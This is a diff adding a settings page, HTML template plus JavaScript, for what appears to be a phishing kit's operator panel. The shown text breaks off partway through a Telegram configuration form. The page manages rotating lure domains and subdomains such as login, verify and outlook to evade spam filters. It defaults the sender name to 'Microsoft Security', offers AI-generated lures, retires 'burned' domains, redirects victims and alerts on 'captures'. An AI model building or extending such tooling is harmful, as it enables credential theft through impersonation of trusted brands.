@@ -1,0 +1,1271 @@
+{% extends "base.html" %}
+{% block title %}Settings{% endblock %}
+{% block page_title %}⚙️ System Settings{% endblock %}
+
+{% block content %}
+
+<!-- ============================================================
+SUBDOMAIN ROTATION - ADVANCED CONTROL
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #ff9800; margin-bottom: 24px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+        <h3 style="margin: 0;"><i class="fas fa-globe" style="color: #ff9800;"></i> 🌐 Subdomain Rotation</h3>
+        <span id="rotationBadge" style="font-size: 13px; padding: 4px 12px; border-radius: 12px; background: {% if settings.rotation_enabled == '1' %}rgba(76, 175, 80, 0.15){% else %}rgba(244, 67, 54, 0.15){% endif %}; color: {% if settings.rotation_enabled == '1' %}#4caf50{% else %}#f44336{% endif %};">
+            {% if settings.rotation_enabled == '1' %}● ACTIVE{% else %}● INACTIVE{% endif %}
+        </span>
+    </div>
+    
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Automatically rotate through subdomains to improve email deliverability and avoid spam filters.
+    </p>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin: 12px 0; padding: 16px; background: var(--bg-secondary); border-radius: 8px;">
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Current Subdomain</div>
+            <div id="currentSubdomain" style="font-weight: bold; font-size: 18px; color: #4caf50;">{{ settings.current_subdomain or 'auth' }}</div>
+        </div>
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Base URL</div>
+            <div id="baseUrlDisplay" style="font-weight: bold; font-size: 14px; color: #2196f3; word-break: break-all;">{{ settings.base_url or 'https://auth.dltufurniture.com' }}</div>
+        </div>
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Index (Position)</div>
+            <div id="subdomainIndex" style="font-weight: bold; font-size: 18px; color: #9c27b0;">{{ settings.subdomain_index or '0' }}</div>
+            <div style="font-size: 11px; color: var(--text-muted);">Next: 
+                {% if settings.subdomains_list %}{% set subdomains = settings.subdomains_list.split(',') %}{% else %}{% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}{% endif %}
+                {% set next_idx = (settings.subdomain_index|int + 1) % subdomains|length %}
+                {{ subdomains[next_idx] }}
+            </div>
+        </div>
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Status</div>
+            <div id="rotationStatus" style="font-weight: bold; font-size: 16px; color: {% if settings.rotation_enabled == '1' %}#4caf50{% else %}#f44336{% endif %};">
+                {% if settings.rotation_enabled == '1' %}✅ ENABLED{% else %}❌ DISABLED{% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        <div style="display: flex; gap: 6px;">
+            <form action="/toggle_rotation" method="POST" style="display: inline;" id="enableForm">
+                <button type="submit" class="btn btn-success" style="padding: 8px 20px; {% if settings.rotation_enabled == '1' %}display: none;{% endif %}">
+                    <i class="fas fa-play"></i> Enable Rotation
+                </button>
+            </form>
+            <form action="/toggle_rotation" method="POST" style="display: inline;" id="disableForm">
+                <button type="submit" class="btn btn-danger" style="padding: 8px 20px; {% if settings.rotation_enabled == '0' %}display: none;{% endif %}">
+                    <i class="fas fa-pause"></i> Disable Rotation
+                </button>
+            </form>
+        </div>
+        <a href="/rotate_now" class="btn btn-primary" style="padding: 8px 20px;">
+            <i class="fas fa-sync"></i> Rotate Now
+        </a>
+        <form action="/set_subdomain" method="POST" style="display: inline-flex; gap: 8px; align-items: center; margin-left: 10px;">
+            <select name="subdomain" style="padding: 8px 12px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+                {% if settings.subdomains_list %}{% set subdomains = settings.subdomains_list.split(',') %}{% else %}{% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}{% endif %}
+                {% for sub in subdomains %}
+                <option value="{{ sub }}" {% if settings.current_subdomain == sub %}selected{% endif %}>{{ sub }}</option>
+                {% endfor %}
+            </select>
+            <button type="submit" class="btn btn-success">Set</button>
+        </form>
+    </div>
+    
+    <div style="margin-top: 12px; padding: 12px; background: var(--bg-secondary); border-radius: 8px;">
+        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Rotation Cycle:</div>
+        <div id="cycleContainer" style="display: flex; flex-wrap: wrap; gap: 4px;">
+            {% if settings.subdomains_list %}{% set subdomains = settings.subdomains_list.split(',') %}{% else %}{% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}{% endif %}
+            {% for sub in subdomains %}
+                {% if sub == settings.current_subdomain %}
+                    <span style="padding: 2px 8px; border-radius: 4px; background: #4caf50; color: white; font-size: 12px; font-weight: bold;">{{ sub }}</span>
+                {% else %}
+                    <span style="padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--text-muted); font-size: 12px;">{{ sub }}</span>
+                {% endif %}
+            {% endfor %}
+        </div>
+        <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">
+            <span style="color: #4caf50;">●</span> Current &nbsp;|&nbsp; <span style="color: var(--text-muted);">○</span> Available
+        </div>
+    </div>
+    
+    <small style="color: var(--text-muted); margin-top: 8px; display: block; font-size: 12px;">
+        <i class="fas fa-info-circle"></i> 
+        <strong>How it works:</strong> When enabled, the system automatically rotates through subdomains to improve email deliverability.
+        <br>
+        <i class="fas fa-sync"></i> 
+        <strong>Auto-Rotation:</strong> {% if settings.rotation_enabled == '1' %}✅ ENABLED - Will rotate on each campaign send{% else %}❌ DISABLED - Manual rotation only{% endif %}
+    </small>
+</div>
+
+<!-- ============================================================
+SMTP CONFIGURATION & PERFORMANCE - COMBINED FORM
+============================================================ -->
+<form method="POST" action="/settings" id="combinedSettingsForm">
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px;">
+        
+        <!-- LEFT: SMTP Configuration -->
+        <div class="glass" style="border-left: 4px solid #007bff;">
+            <h3><i class="fas fa-envelope" style="color: #007bff;"></i> 📧 SMTP Configuration</h3>
+            <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Configure your primary email server.</p>
+            
+            <div style="display: grid; gap: 12px;">
+                <div class="form-group">
+                    <label>SMTP Server</label>
+                    <input type="text" name="smtp_server" class="form-control" value="{{ settings.smtp_server or '' }}" placeholder="smtp.yourdomain.com">
+                </div>
+                <div class="form-group">
+                    <label>SMTP Port</label>
+                    <input type="number" name="smtp_port" class="form-control" value="{{ settings.smtp_port or '587' }}" placeholder="587">
+                </div>
+                <div class="form-group">
+                    <label>SMTP Username</label>
+                    <input type="text" name="smtp_username" class="form-control" value="{{ settings.smtp_username or '' }}" placeholder="username">
+                </div>
+                <div class="form-group">
+                    <label>SMTP Password</label>
+                    <input type="password" name="smtp_password" class="form-control" value="{{ settings.smtp_password or '' }}" placeholder="••••••••">
+                </div>
+                <div class="form-group">
+                    <label>From Email</label>
+                    <input type="email" name="smtp_from" class="form-control" value="{{ settings.smtp_from or '' }}" placeholder="sender@yourdomain.com">
+                </div>
+                <div class="form-group">
+                    <label>Sender Name</label>
+                    <input type="text" name="sender_name" class="form-control" value="{{ settings.sender_name or 'Microsoft Security' }}" placeholder="Microsoft Security">
+                </div>
+            </div>
+        </div>
+        
+        <!-- RIGHT: Performance & AI -->
+        <div class="glass" style="border-left: 4px solid #9c27b0;">
+            <h3><i class="fas fa-sliders-h" style="color: #9c27b0;"></i> ⚡ Performance & AI</h3>
+            <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Configure sending limits and AI features.</p>
+            
+            <div style="display: grid; gap: 12px;">
+                <div class="form-group">
+                    <label>Base URL</label>
+                    <input type="text" name="base_url" class="form-control" value="{{ settings.base_url or 'https://auth.dltufurniture.com' }}" placeholder="https://auth.yourdomain.com">
+                    <small style="color: var(--text-muted); font-size: 11px;">The URL used for lure links</small>
+                </div>
+                <div class="form-group">
+                    <label>Max Threads</label>
+                    <input type="number" name="max_workers" class="form-control" value="{{ settings.max_workers or '5' }}" placeholder="5">
+                    <small style="color: var(--text-muted); font-size: 11px;">Number of parallel sending workers</small>
+                </div>
+                <div class="form-group">
+                    <label>Rate Limit (per minute)</label>
+                    <input type="number" name="rate_limit_per_minute" class="form-control" value="{{ settings.rate_limit_per_minute or '60' }}" placeholder="60">
+                    <small style="color: var(--text-muted); font-size: 11px;">Maximum emails per minute</small>
+                </div>
+                <div class="form-group">
+                    <label>OpenAI API Key</label>
+                    <input type="password" name="openai_api_key" class="form-control" value="{{ settings.openai_api_key or '' }}" placeholder="sk-...">
+                    <small style="color: var(--text-muted); font-size: 11px;">Optional: For AI-powered lure generation</small>
+                </div>
+                <div class="form-group">
+                    <div style="display: flex; align-items: center; gap: 12px; padding: 10px 14px; background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border);">
+                        <input type="checkbox" name="enable_ai_lures" id="enable_ai_lures" {% if settings.enable_ai_lures %}checked{% endif %} style="width: 18px; height: 18px; cursor: pointer;">
+                        <label for="enable_ai_lures" style="margin: 0; font-weight: 500; cursor: pointer; color: var(--text-primary);">Enable AI Lures</label>
+                        <span style="margin-left: auto; font-size: 12px; color: var(--text-muted); background: var(--bg-primary); padding: 2px 10px; border-radius: 12px;">
+                            <i class="fas fa-info-circle"></i> requires OpenAI key
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Combined Save Button -->
+    <div style="text-align: center; margin-top: 16px;">
+        <button type="submit" class="btn btn-primary btn-lg" style="padding: 12px 40px; font-size: 16px;">
+            <i class="fas fa-save"></i> Save All Settings
+        </button>
+    </div>
+</form>
+
+<!-- ============================================================
+SMTP ROTATION PROVIDERS
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #28a745; margin-bottom: 24px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+        <h3 style="margin: 0;"><i class="fas fa-exchange-alt" style="color: #28a745;"></i> 🔄 SMTP Rotation Providers</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(40, 167, 69, 0.15); color: #28a745;">
+            <i class="fas fa-check-circle"></i> {{ smtp_providers|length }} providers
+        </span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Add multiple SMTP providers for rotation. The system will automatically switch if one fails.</p>
+    
+    <form method="POST" action="/smtp/add" style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px;">
+        <input type="text" name="name" class="form-control" placeholder="Provider Name" required>
+        <input type="text" name="server" class="form-control" placeholder="SMTP Server" required>
+        <input type="number" name="port" class="form-control" placeholder="Port" required>
+        <input type="text" name="username" class="form-control" placeholder="Username" required>
+        <input type="password" name="password" class="form-control" placeholder="Password" required>
+        <input type="email" name="from_email" class="form-control" placeholder="From Email" required>
+        <button type="submit" class="btn btn-success" style="grid-column: span 2;">
+            <i class="fas fa-plus"></i> Add SMTP Provider
+        </button>
+    </form>
+    
+    <div class="table-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Server</th>
+                    <th>From</th>
+                    <th>Score</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for provider in smtp_providers %}
+                <tr>
+                    <td>{{ provider.name }}</td>
+                    <td>{{ provider.server }}</td>
+                    <td>{{ provider.from_email }}</td>
+                    <td>{{ provider.score or 100 }}</td>
+                    <td>
+                        <span style="color: {% if provider.enabled %}#4caf50{% else %}#f44336{% endif %};">
+                            {% if provider.enabled %}✅ Enabled{% else %}❌ Disabled{% endif %}
+                        </span>
+                    </td>
+                    <td>
+                        <form method="POST" action="/smtp/{{ provider.id }}/toggle" style="display: inline;">
+                            <button type="submit" class="btn btn-sm btn-{% if provider.enabled %}warning{% else %}success{% endif %}">
+                                {% if provider.enabled %}Disable{% else %}Enable{% endif %}
+                            </button>
+                        </form>
+                        <form method="POST" action="/smtp/{{ provider.id }}/delete" style="display: inline;">
+                            <button type="submit" class="btn btn-sm btn-danger" onclick="return confirm('Delete this provider?')">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+                {% else %}
+                <tr><td colspan="6" style="text-align: center; color: var(--text-muted);">No SMTP providers configured</td></tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- ============================================================
+TEST EMAIL
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #17a2b8; margin-bottom: 24px;">
+    <h3><i class="fas fa-paper-plane" style="color: #17a2b8;"></i> 📤 Send Test Email</h3>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Verify your SMTP configuration by sending a test email.</p>
+    
+    <form id="testEmailForm" onsubmit="sendTestEmail(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin-bottom: 12px;">
+            <input type="email" id="testEmail" class="form-control" placeholder="Enter recipient email" required>
+            <input type="text" id="testSubject" class="form-control" placeholder="Subject (optional)" value="Test Email">
+            <button type="submit" class="btn btn-primary">
+                <i class="fas fa-paper-plane"></i> Send Test Email
+            </button>
+        </div>
+        <div id="testEmailStatus" style="margin-top: 8px;"></div>
+    </form>
+</div>
+
+<!-- ============================================================
+LURE DOMAIN MANAGEMENT
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #9c27b0; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
+        <h3 style="margin: 0;"><i class="fas fa-globe" style="color: #9c27b0;"></i> 🎯 Lure Domain Management</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(156, 39, 176, 0.15); color: #9c27b0;">
+            <i class="fas fa-check-circle"></i> Change anytime
+        </span>
+    </div>
+
+    <div style="padding: 12px 16px; border-radius: 8px; background: rgba(33, 150, 243, 0.08); border-left: 3px solid #2196f3; margin-bottom: 16px;">
+        <i class="fas fa-info-circle"></i>
+        <strong>Current Lure Domain:</strong> 
+        <code id="currentLureDomain" style="background: rgba(0,0,0,0.1); padding: 2px 8px; border-radius: 4px;">{{ settings.base_url or 'https://auth.dltufurniture.com' }}</code>
+        <br>
+        <small style="color: var(--text-muted);">All lure links use this domain. Change it to a new domain after setting up DNS.</small>
+    </div>
+
+    <form id="domainForm" onsubmit="updateLureDomain(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px;">
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">New Domain Name</label>
+                <input type="text" id="newLureDomain" class="form-control" 
+                       placeholder="e.g., newdomain.com" 
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+                <small style="color: var(--text-muted);">Enter only the domain (without https:// or www.)</small>
+            </div>
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">Subdomains (comma separated)</label>
+                <input type="text" id="newLureSubdomains" class="form-control" 
+                       value="auth, secure, login, verify, account, portal, office, outlook, help, support, docs, teams"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+                <small style="color: var(--text-muted);">These will become: https://SUBDOMAIN.YOURDOMAIN.com/c/token</small>
+            </div>
+        </div>
+
+        <div id="domainPreview" style="display: none; padding: 12px 16px; border-radius: 8px; background: rgba(76, 175, 80, 0.08); border-left: 3px solid #4caf50; margin-bottom: 16px;">
+            <strong style="color: #4caf50;"><i class="fas fa-eye"></i> Preview:</strong>
+            <div id="previewLinks" style="margin-top: 6px; font-size: 13px; color: var(--text-muted);"></div>
+        </div>
+
+        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <button type="submit" class="btn btn-primary" style="padding: 10px 24px; border-radius: 6px; background: #9c27b0; color: white; border: none; cursor: pointer; font-weight: 600;">
+                <i class="fas fa-sync-alt"></i> Update Lure Domain
+            </button>
+            <button type="button" class="btn btn-secondary" onclick="resetToDefaultDomain()" style="padding: 10px 24px; border-radius: 6px; background: var(--bg-secondary); border: 1px solid var(--border); cursor: pointer;">
+                <i class="fas fa-undo"></i> Reset to Default
+            </button>
+        </div>
+
+        <div id="domainUpdateStatus" style="margin-top: 12px;"></div>
+    </form>
+
+    <small style="color: var(--text-muted); margin-top: 12px; display: block; font-size: 12px;">
+        <i class="fas fa-exclamation-triangle" style="color: #ff9800;"></i> 
+        <strong>Important:</strong> Before updating, make sure your new domain's DNS records are configured with all subdomains pointing to your server IP.
+    </small>
+</div>
+
+
+
+<!-- ============================================================
+LURE DOMAIN ROTATION - ROUND-ROBIN
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #9c27b0; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
+        <h3 style="margin: 0;"><i class="fas fa-sync-alt" style="color: #9c27b0;"></i> 🌐 Lure Domain Rotation</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(156, 39, 176, 0.15); color: #9c27b0;">
+            <i class="fas fa-check-circle"></i> Round-Robin
+        </span>
+    </div>
+
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Manage multiple lure domains for automatic round-robin rotation. Burned domains are automatically skipped.
+    </p>
+
+    <div style="display: flex; gap: 16px; margin-bottom: 16px; align-items: center; flex-wrap: wrap;">
+        <div style="display: flex; align-items: center; gap: 8px;">
+            <label style="font-weight: 500;">Auto-Rotation:</label>
+            <input type="checkbox" id="lureRotationEnabled" checked>
+        </div>
+        <div style="font-size: 13px; color: var(--text-muted);">
+            Current: <span id="currentDomainDisplay" style="font-weight: 600; color: #4caf50;">Loading...</span>
+            <span style="margin: 0 8px;">→</span>
+            Next: <span id="nextDomainDisplay" style="font-weight: 600; color: #2196f3;">Loading...</span>
+        </div>
+        <button onclick="manualRotate()" class="btn btn-primary btn-sm">
+            <i class="fas fa-sync"></i> Rotate Now
+        </button>
+    </div>
+
+    <div style="display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap;">
+        <input type="text" id="newLureDomainInput" placeholder="e.g., newdomain.com" 
+               style="flex: 1; min-width: 200px; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+        <button onclick="addLureDomainUI()" class="btn btn-success" style="padding: 10px 24px; background: #4caf50; color: white; border: none; border-radius: 6px; cursor: pointer;">
+            <i class="fas fa-plus"></i> Add
+        </button>
+        <button onclick="refreshDomains()" class="btn btn-secondary" style="padding: 10px 24px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; cursor: pointer;">
+            <i class="fas fa-sync"></i> Refresh
+        </button>
+    </div>
+
+    <div id="lureDomainsList">
+        <div style="text-align: center; padding: 20px; color: var(--text-muted);">
+            <i class="fas fa-spinner fa-spin"></i> Loading domains...
+        </div>
+    </div>
+
+    <div id="lureDomainMessage" style="margin-top: 10px;"></div>
+</div>
+
+<script>
+// ============================================================
+// LURE DOMAIN ROTATION UI
+// ============================================================
+
+function loadLureDomainsUI() {
+    const container = document.getElementById('lureDomainsList');
+    
+    fetch('/api/lure_domains')
+        .then(res => res.json())
+        .then(data => {
+            if (data.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--text-muted); border: 1px dashed var(--border); border-radius: 8px;">No lure domains configured. Add one above.</div>';
+                return;
+            }
+            
+            let html = '<div style="border: 1px solid var(--border); border-radius: 8px; overflow: hidden;">';
+            html += '<div style="display: grid; grid-template-columns: 40px 1fr 100px 80px 100px 50px; gap: 10px; padding: 10px 14px; background: var(--bg-secondary); font-weight: 600; font-size: 12px; border-bottom: 1px solid var(--border);">';
+            html += '<div>#</div><div>Domain</div><div>Status</div><div>Priority</div><div>Actions</div><div></div>';
+            html += '</div>';
+            
+            data.forEach((d, index) => {
+                const isActive = d.enabled === 1 && d.status !== 'burned';
+                const statusColor = isActive ? '#4caf50' : (d.status === 'burned' ? '#f44336' : '#ff9800');
+                const statusText = isActive ? '🟢 Active' : (d.status === 'burned' ? '🔴 Burned' : '⚪ Inactive');
+                
+                html += '<div style="display: grid; grid-template-columns: 40px 1fr 100px 80px 100px 50px; gap: 10px; padding: 10px 14px; border-bottom: 1px solid var(--border); align-items: center; background: var(--bg-primary);">' +
+                    '<div style="color: var(--text-muted);">' + (index + 1) + '</div>' +
+                    '<div style="word-break: break-all;">' + d.domain + '</div>' +
+                    '<div><span style="display: inline-block; padding: 2px 10px; border-radius: 12px; background: ' + statusColor + '20; color: ' + statusColor + '; font-size: 12px; font-weight: 600;">' + statusText + '</span></div>' +
+                    '<div style="font-size: 12px; color: var(--text-muted);">' + d.priority + '</div>' +
+                    '<div>' +
+                        (isActive ? 
+                            '<button onclick="burnDomain(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid #f44336; background: transparent; color: #f44336; cursor: pointer; font-size: 12px;" title="Mark as Burned">🔥 Burn</button>' :
+                            '<button onclick="toggleDomain(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid #4caf50; background: transparent; color: #4caf50; cursor: pointer; font-size: 12px;">Enable</button>'
+                        ) +
+                    '</div>' +
+                    '<div><button onclick="deleteDomain(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid #f44336; background: transparent; color: #f44336; cursor: pointer; font-size: 12px;"><i class="fas fa-trash"></i></button></div>' +
+                '</div>';
+            });
+            
+            html += '</div>';
+            container.innerHTML = html;
+            
+            // Update current/next display
+            updateDomainStatus();
+        })
+        .catch(err => {
+            container.innerHTML = '<div style="color: #f44336; padding: 10px;">❌ Error loading domains: ' + err.message + '</div>';
+        });
+}
+
+function updateDomainStatus() {
+    fetch('/api/domain_status')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('currentDomainDisplay').textContent = data.domain || 'None';
+            
+            // Find next domain
+            fetch('/api/lure_domains')
+                .then(res => res.json())
+                .then(domains => {
+                    if (domains && domains.length > 0) {
+                        const active = domains.filter(d => d.enabled === 1 && d.status !== 'burned');
+                        if (active.length > 1) {
+                            const currentIndex = active.findIndex(d => d.domain === data.domain);
+                            const nextIndex = (currentIndex + 1) % active.length;
+                            document.getElementById('nextDomainDisplay').textContent = active[nextIndex]?.domain || 'None';
+                        } else if (active.length === 1) {
+                            document.getElementById('nextDomainDisplay').textContent = active[0]?.domain || 'None';
+                        } else {
+                            document.getElementById('nextDomainDisplay').textContent = 'No domains';
+                        }
+                    }
+                })
+                .catch(() => {
+                    document.getElementById('nextDomainDisplay').textContent = 'Error loading';
+                });
+        })
+        .catch(err => {
+            console.log('Error updating status:', err);
+        });
+}
+
+function addLureDomainUI() {
+    const input = document.getElementById('newLureDomainInput');
+    const domain = input.value.trim();
+    const msgDiv = document.getElementById('lureDomainMessage');
+    
+    if (!domain) {
+        alert('⚠️ Please enter a domain');
+        return;
+    }
+    
+    msgDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Adding domain...</div>';
+    
+    fetch('/api/lure_domains', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ domain: domain })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            msgDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            msgDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+            input.value = '';
+            loadLureDomainsUI();
+        }
+    })
+    .catch(err => {
+        msgDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+function toggleDomain(id) {
+    fetch('/api/lure_domains/' + id + '/toggle', { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadLureDomainsUI(); }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function burnDomain(id) {
+    if (!confirm('⚠️ Mark this lure domain as burned? It will be removed from rotation.')) { return; }
+    fetch('/api/lure_domains/' + id + '/burn', { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadLureDomainsUI(); }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function deleteDomain(id) {
+    if (!confirm('⚠️ Delete this lure domain?')) { return; }
+    fetch('/api/lure_domains/' + id, { method: 'DELETE' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadLureDomainsUI(); }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function refreshDomains() {
+    loadLureDomainsUI();
+    document.getElementById('lureDomainMessage').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">🔄 Refreshed</div>';
+}
+
+function manualRotate() {
+    fetch('/api/rotate', { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else {
+                document.getElementById('lureDomainMessage').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ Rotated to: ' + data.domain + ' (' + data.subdomain + ')</div>';
+                loadLureDomainsUI();
+            }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+// Load on page load
+document.addEventListener('DOMContentLoaded', function() {
+    loadLureDomainsUI();
+});
+
+// Refresh every 30 seconds
+setInterval(loadLureDomainsUI, 30000);
+</script>
+<!-- ============================================================
+WORKER DOMAINS MANAGEMENT
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #ff9800; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
+        <h3 style="margin: 0;"><i class="fas fa-link" style="color: #ff9800;"></i> 🔗 Worker Domains</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(255, 152, 0, 0.15); color: #ff9800;">
+            <i class="fas fa-check-circle"></i> Manage redirects
+        </span>
+    </div>
+
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Domains where victims are redirected when "Worker Redirect" is enabled. Add multiple domains for rotation.
+    </p>
+
+    <div style="display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap;">
+        <input type="text" id="newWorkerDomain" placeholder="e.g., worker.yourdomain.com" 
+               style="flex: 1; min-width: 200px; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+        <button onclick="addWorkerDomain()" class="btn btn-success" style="padding: 10px 24px; background: #4caf50; color: white; border: none; border-radius: 6px; cursor: pointer;">
+            <i class="fas fa-plus"></i> Add
+        </button>
+        <button onclick="refreshWorkerDomains()" class="btn btn-secondary" style="padding: 10px 24px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; cursor: pointer;">
+            <i class="fas fa-sync"></i> Refresh
+        </button>
+    </div>
+
+    <div id="workerDomainsList">
+        <div style="text-align: center; padding: 20px; color: var(--text-muted);">
+            <i class="fas fa-spinner fa-spin"></i> Loading...
+        </div>
+    </div>
+
+    <div id="workerDomainStatus" style="margin-top: 10px;"></div>
+</div>
+
+<!-- ============================================================
+TELEGRAM SETTINGS
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #00bcd4; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
+        <h3 style="margin: 0;"><i class="fab fa-telegram" style="color: #00bcd4;"></i> 🤖 Telegram Notifications</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(0, 188, 212, 0.15); color: #00bcd4;">
+            <i class="fas fa-check-circle"></i> Instant alerts
+        </span>
+    </div>
+
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Configure Telegram bot to receive notifications about captures, logins, and system events.
+    </p>
+
+    <form id="telegramForm" onsubmit="updateTelegram(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px;">
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">Bot Token</label>
+                <input type="text" id="telegramBotToken" class="form-control" 
+                       placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+                <small style="color: var(--text-muted);">Get from <a href="https://t.me/BotFather" target="_blank">@BotFather</a></small>
+            </div>
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">Chat ID</label>
+                <input type="text" id="telegramChatId" class="form-control" 
+                       placeholder="123456789"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+                <small style="color: var(--text-muted);">Get from <a href="https://t.me/GetMyChatIdBot" target="_blank">@GetMyChatIdBot</a></small>
+            </div>
+        </div>
+
